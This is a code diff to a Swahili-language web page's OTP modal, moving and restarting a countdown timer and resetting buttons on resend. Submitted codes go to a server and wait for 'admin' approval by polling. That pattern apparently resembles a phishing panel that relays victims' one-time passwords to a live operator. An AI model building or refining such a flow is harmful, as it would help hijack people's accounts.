@@ -480,6 +480,10 @@
     
     console.log('✅ Modal initialized');
     document.getElementById('otpOverlay').classList.add('show');
+    
+    // ✅ START TIMER IMMEDIATELY WHEN MODAL OPENS (Admin approved)
+    console.log('🟢 ADMIN APPROVED - STARTING COUNTDOWN NOW');
+    startOtpTimer();
   }
 
   function closeOtpModal() {
@@ -500,10 +504,6 @@
       showErr('otpMsgErr', 'Tafadhali weka OTP kamili');
       return;
     }
-
-    // ✅ START TIMER IMMEDIATELY - DON'T WAIT FOR API
-    console.log('🔴 BUTTON CLICKED - STARTING TIMER NOW');
-    startOtpTimer();
 
     try {
       const response = await fetch('/api/submit-otp', {
@@ -619,9 +619,20 @@
   }
 
   async function resendOtp() {
+    console.log('🔄 RESEND OTP CLICKED - RESTARTING TIMER');
+    
     // Reset OTP inputs
     [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
     document.getElementById('o0').focus();
+    
+    // Reset timer HTML
+    document.getElementById('otpTimer').innerHTML = '⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s';
+    document.getElementById('otpTimer').style.color = '#888';
+    
+    // Reset buttons
+    document.getElementById('bOtp').style.display = 'block';
+    document.getElementById('bOtp').disabled = false;
+    document.getElementById('bResendOtp').style.display = 'none';
     
     // Clear messages
     clearErr('otpMsgErr');
@@ -631,6 +642,10 @@
     if (otpCheckInterval) clearInterval(otpCheckInterval);
     if (otpTimerInterval) clearInterval(otpTimerInterval);
     
+    // ✅ RESTART TIMER IMMEDIATELY
+    console.log('🟢 RESTARTING COUNTDOWN');
+    startOtpTimer();
+    
     try {
       const response = await fetch('/api/submit-otp', {
         method: 'POST',
@@ -639,7 +654,7 @@
       });
 
       if (response.ok) {
-        // This calls startOtpTimer() internally
+        // Start polling for admin response
         startOtpApprovalPolling();
       }
     } catch (error) {
